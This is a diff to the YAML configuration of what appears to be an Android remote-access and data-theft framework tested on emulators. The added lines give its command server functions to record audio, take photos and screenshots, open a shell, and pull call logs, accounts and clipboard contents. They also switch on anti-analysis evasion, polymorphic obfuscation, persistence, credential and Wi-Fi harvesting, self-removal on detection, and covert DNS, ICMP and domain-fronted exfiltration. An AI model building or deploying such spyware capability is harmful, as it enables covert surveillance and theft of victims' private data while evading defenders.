@@ -13,9 +13,18 @@ paths:
 
 c2:
   host: 0.0.0.0
-  port: 5000
-  # Host IP reachable from Genymotion VMs (VirtualBox host-only is often 10.0.3.2)
+  port: 8080
   public_host: 10.0.3.2
+  tls_cert: null
+  tls_key: null
+  api_key: null
+  jitter_ms: 5000
+  rate_limit_max: 30
+  rate_limit_window: 60
+  dead_drop_domain: null
+  session_ttl_hours: 72
+  key_rotation_hours: 1
+  max_exfil_bytes: 52428800
   commands:
     - EXFIL_ALL
     - GET_DEVICE_INFO
@@ -23,6 +32,16 @@ c2:
     - EXFIL_SMS
     - EXFIL_CONTACTS
     - GET_LOCATION
+    - EXFIL_CALL_LOG
+    - TAKE_PHOTO
+    - RECORD_AUDIO
+    - SCREENSHOT
+    - SHELL
+    - LIST_FILES
+    - CLIPBOARD
+    - GET_ACCOUNTS
+    - GET_WIFI_INFO
+    - SELF_DESTRUCT
 
 emulator:
   backend: genymotion
@@ -38,6 +57,7 @@ analysis:
   timeout: 300
   frida_enabled: true
   frida_script: frida_hooks.js
+  evasion_script: frida_evasion.js
   frida_duration: 45
   monkey_events: 50
   grant_permissions: true
@@ -53,3 +73,54 @@ physical_device:
   allow_root: false
   install_options: "-r -t"
   timeout: 300
+
+evasion:
+  enabled: true
+  modes:
+    - root
+    - frida
+    - emulator
+    - debugger
+    - safetynet
+  frida_evasion: true
+  spoof_build: true
+
+obfuscation:
+  enabled: true
+  string_encryption: true
+  junk_code: true
+  manifest_patching: true
+  polymorphic: true
+
+post_exploit:
+  enabled: true
+  persistence: true
+  credential_harvest: true
+  clipboard_monitor: true
+  wifi_stealer: true
+
+opsec:
+  ttl_hours: 72
+  auto_destruct: true
+  stealth_logging: true
+  self_remove_on_detection: true
+  encrypt_comms: true
+  cleanup_on_exit: true
+
+covert_channels:
+  dns_tunnel: false
+  dns_domain: null
+  icmp_exfil: false
+  icmp_target: null
+  domain_fronting: false
+  front_cdn: cloudfront
+  front_domain: null
+  traffic_mimicry: true
+  chunked_exfil: true
+  chunk_size: 512
+
+reporting:
+  enabled: true
+  format: html
+  mitre_attack: true
+  output_dir: ./reports
